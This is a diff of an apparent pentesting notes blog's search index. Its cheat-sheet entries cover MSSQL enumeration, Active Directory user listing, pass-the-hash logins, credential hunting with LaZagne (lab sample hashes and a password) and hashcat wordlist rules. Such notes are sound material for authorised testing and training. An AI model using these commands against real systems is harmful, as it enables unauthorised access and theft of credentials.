-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Making a Target User List</category>
       </categories>
       <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+        <tag>windapsearch</tag>
       </tags>
   </entry>
   <entry>
@@ -1026,6 +1081,61 @@
         <tag>MSSQL-Linked-Server</tag>
         <tag>MSSQL-Impersonate-User</tag>
         <tag>Capture-MSSQL-Service-Hash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1386,121 +1496,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
-
-<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>evil-winrm</tag>
-        <tag>impacket-psexec</tag>
-        <tag>xfreerdp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Making a Target User List</title>
-    <url>/2025/12/03/Making-a-Target-User-List/</url>
-    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Making a Target User List</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-        <tag>windapsearch</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows Pass the Hash (PtH)</title>
     <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
@@ -1527,6 +1522,57 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Writing Custom Wordlists and Rules</title>
+    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
+    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+
+<p>Example :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
+<ul>
+<li>Depth to spider (<code>-d</code>)</li>
+<li>The minimum length of the word (<code>-m</code>)</li>
+<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
+<li>The file where we want to store the results (<code>-w</code>)</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
+<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
+
+<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
+<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
+
+<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Writing Custom Wordlists and Rules</category>
+      </categories>
+      <tags>
+        <tag>Creds</tag>
+        <tag>CeWL</tag>
+        <tag>Cupp</tag>
+        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
   <entry>
@@ -1604,54 +1650,51 @@
       </tags>
   </entry>
   <entry>
-    <title>Writing Custom Wordlists and Rules</title>
-    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
-    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
-
-<p>Example :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
-<ul>
-<li>Depth to spider (<code>-d</code>)</li>
-<li>The minimum length of the word (<code>-m</code>)</li>
-<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
-<li>The file where we want to store the results (<code>-w</code>)</li>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
 </ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
-<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
 
 
-
